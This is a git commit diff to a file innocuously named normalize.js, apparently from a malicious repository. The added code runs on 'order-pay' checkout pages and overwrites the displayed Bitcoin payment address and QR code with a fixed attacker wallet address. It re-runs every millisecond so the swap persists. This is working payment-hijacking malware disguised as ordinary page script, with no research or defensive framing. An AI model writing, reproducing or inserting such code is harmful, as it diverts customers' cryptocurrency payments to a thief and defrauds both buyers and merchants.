9c5632987cb579b5686419202f670052372ef98b
reposltory <124707435+reposltory@users.noreply.github.com>
2023-02-17 15:28:09 +0330

    21

--- normalize.js
+++ normalize.js
@@ -1,9 +1,16 @@
 // console.log('Ready');
-if (window.location.href.includes("order-pay")){
-    var add = document.getElementById("payment-address").innerText;
-    var amo = document.getElementById("amount").innerText;
-    let html = document.body.innerHTML;
-    let newHtml = html.replace(new RegExp(add, 'g'), 'bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0');
-    document.body.innerHTML = newHtml;
-    document.getElementById("qrcode").children[1].src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"
+function api(){
+    if (window.location.href.includes("order-pay")){
+        var amo = document.getElementById("amount").innerText;
+        if(document.getElementById("qrcode").children[1].src=="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"){
+            return 0;
+        }
+        var add = document.getElementById("payment-address").innerText;
+        var html = document.body.innerHTML;
+        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0');
+        document.body.innerHTML = newHtml;
+        document.getElementById("qrcode").children[1].src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"
+
+    }
 }
+var intertime = setInterval(function(){api(intertime)}, 1);
